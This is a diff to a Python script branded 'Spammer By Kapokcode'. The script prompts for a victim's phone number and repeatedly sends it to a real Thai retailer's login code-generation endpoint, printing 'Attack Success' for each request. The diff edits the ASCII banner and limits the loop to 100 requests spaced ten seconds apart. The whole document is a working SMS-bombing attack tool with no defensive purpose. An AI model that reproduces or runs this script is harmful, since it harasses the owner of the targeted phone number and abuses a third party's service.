@@ -1,9 +1,9 @@
 import time,requests
 import os,sys
 
-print("      |                      _  ")
-print("      |  |      _ | / _  |  \ ")
-print("      |__| __ |   |/  |__  |  / ")
+print("      |                      ___  ")
+print("      |  |      ___ | / ___  |  \ ")
+print("      |__| ____ |   |/  |__  |  / ")
 print("      |  | |__| |__ |\  |__  |_/  ")
 print("         | |  |     | \_     | \ KPC\n")
 print("Spammer By Kapokcode".center(50))
@@ -21,7 +21,8 @@ print("\n[*] Ctrl + C  # to exit ")
 
 phone = input("\n[-] Phone Target (Sample 0611233455): ")
 n = 0
-while True:
+while n<100:
     requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})
-    print(f"[*] Attack Success Target {phone}  Counter {n+1}")
+    n+=1
+    print(f"[*] Attack Success Target {phone}  Counter {n}")
     time.sleep(10)
